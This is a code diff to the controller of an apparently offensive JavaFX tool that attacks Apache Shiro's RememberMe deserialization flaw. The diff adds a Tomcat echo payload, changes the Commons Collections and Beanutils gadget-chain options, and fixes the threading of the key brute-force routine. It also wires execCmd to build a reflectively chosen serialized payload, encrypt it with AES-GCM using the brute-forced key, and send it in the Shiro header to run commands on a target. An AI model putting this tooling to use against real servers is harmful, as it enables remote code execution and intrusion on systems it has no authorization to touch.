@@ -4,6 +4,7 @@ import cn.safe6.core.*;
 import cn.safe6.core.http.Request;
 import cn.safe6.core.jobs.BurstJob;
 import cn.safe6.payload.TomcatEcho;
+import cn.safe6.payload.TomcatEchoAll;
 import cn.safe6.util.*;
 import javafx.application.Platform;
 import javafx.collections.FXCollections;
@@ -132,14 +133,18 @@ public class Controller {
         checkType.setValue("SimplePrincipalCollection");
         checkType.setItems(checkTypeData);
 
-        ObservableList<String> serverTypeData = FXCollections.observableArrayList("Tomcat");
-        serverType.setValue("Tomcat");
+        ObservableList<String> serverTypeData = FXCollections.observableArrayList("TomcatEcho","TomcatEchoAll");
+        serverType.setValue("TomcatEcho");
         serverType.setItems(serverTypeData);
 
-        ObservableList<String> gadgetData = FXCollections.observableArrayList("CommonsCollectionsK1", "CommonsCollectionsK2","CommonsCollectionsK3","CommonsCollectionsK4");
+        ObservableList<String> gadgetData = FXCollections.observableArrayList();
         gadgetData.add("CommonsBeanutils1");
         gadgetData.add("CommonsCollections6");
-        gadgetData.add("CommonsCollectionsShiro");
+        gadgetData.add("CommonsCollectionsK1");
+        gadgetData.add("CommonsCollectionsK2");
+       // gadgetData.add("CommonsCollectionsK3");
+        //gadgetData.add("CommonsCollectionsK4");
+        //gadgetData.add("CommonsCollectionsShiro");
 
         gadget.setValue("CommonsCollectionsK1");
         gadget.setItems(gadgetData);
@@ -173,9 +178,7 @@ public class Controller {
     @FXML
     public void burstKey(ActionEvent actionEvent) {
 
-        Platform.runLater(() -> {
-            burstKey.setDisable(true);
-        });
+        Platform.runLater(() -> burstKey.setDisable(true));
 
         try {
             this.validAllDataAndSetConfig();
@@ -204,7 +207,8 @@ public class Controller {
         }catch (Exception e){
             e.printStackTrace();
         }finally {
-            burstKey.setDisable(false);
+            //burstKey.setDisable(false);
+            Platform.runLater(() -> burstKey.setDisable(false));
         }
 
 
@@ -212,7 +216,6 @@ public class Controller {
 
     @FXML
     public void execCmd(ActionEvent actionEvent) throws IOException {
-        CloseableHttpResponse closeableHttpResponse = null;
         try {
             Platform.runLater(() -> {
                 execCmd.setDisable(true);
@@ -232,14 +235,17 @@ public class Controller {
 
 
             String expName =gadget.getValue().toString();
+            String echo =serverType.getValue().toString();
             String url = paramsContext.get("url").toString();
             String method = paramsContext.get("method").toString();
             String rmeValue = paramsContext.get("rmeValue").toString();
             Map<String,Object> params = (Map<String, Object>) paramsContext.get("params");
 
             Class clazz = Class.forName(Constants.PAYLOAD_PACK+expName);
+            Class clazz1 = Class.forName(Constants.PAYLOAD_PACK+echo);
             Method mtd = clazz.getMethod("getPayload",byte[].class);
-            byte[] payload = (byte[]) mtd.invoke(null, TomcatEcho.getPayload());
+
+            byte[] payload = (byte[]) mtd.invoke(null, clazz1.getMethod("getPayload").invoke(clazz1));
 
             Map<String, Object> header = ShiroTool.getShiroHeader((Map<String, Object>) paramsContext.get("header"),rmeValue);
             String encryptData = PayloadEncryptTool.AesGcmEncrypt(payload,key);
